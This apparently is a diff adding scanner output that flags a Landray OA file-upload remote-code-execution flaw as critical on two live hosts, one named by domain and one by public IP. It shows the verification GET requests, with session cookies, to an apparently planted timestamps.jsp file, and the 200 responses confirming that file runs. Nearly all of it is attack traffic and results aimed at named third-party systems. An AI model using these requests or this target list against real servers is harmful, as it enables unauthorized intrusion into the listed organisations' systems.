@@ -1,0 +1,44 @@
+http://erp.checrc.com:9081               🤓 landray
+http://122.233.90.58:9081                🤓 landray
+[vuln] [critical] [landary-oa-sysuicomponent-fileupload] [landray, oa, treexml, rce, vuln] http://122.233.90.58:9081/resource/ui-component/2023/timestamps.jsp
+[vuln] [critical] [landary-oa-sysuicomponent-fileupload] [landray, oa, treexml, rce, vuln] http://erp.checrc.com:9081/resource/ui-component/2023/timestamps.jsp
+================  请求数据包 ================
+GET /resource/ui-component/2023/timestamps.jsp HTTP/1.1
+Host: erp.checrc.com:9081
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+Connection: close
+Cookie: SESSION=ZGJmNGZlNTItZmQyZi00MTc3LWIwODktZTBhYWNkZmNiOGVi
+Accept-Encoding: gzip
+
+
+================  请求数据包 ================
+================  请求响应包 ================
+GET /resource/ui-component/2023/timestamps.jsp HTTP/1.1
+Host: 122.233.90.58:9081
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+Connection: close
+Cookie: SESSION=YjJiOGUzYjAtNWY1MS00OTYwLThjMjQtZWU4ODk3ZDgzMWVm
+Accept-Encoding: gzip
+
+
+HTTP/1.1 200 
+Connection: close
+Content-Length: 8
+Access-Control-Allow-Origin: *
+Content-Type: text/html;charset=ISO-8859-1
+Date: Mon, 30 Mar 2026 07:55:25 GMT
+
+400841
+
+============================================
+================  请求响应包 ================
+HTTP/1.1 200 
+Connection: close
+Content-Length: 8
+Access-Control-Allow-Origin: *
+Content-Type: text/html;charset=ISO-8859-1
+Date: Mon, 30 Mar 2026 07:55:25 GMT
+
+400841
+
+============================================
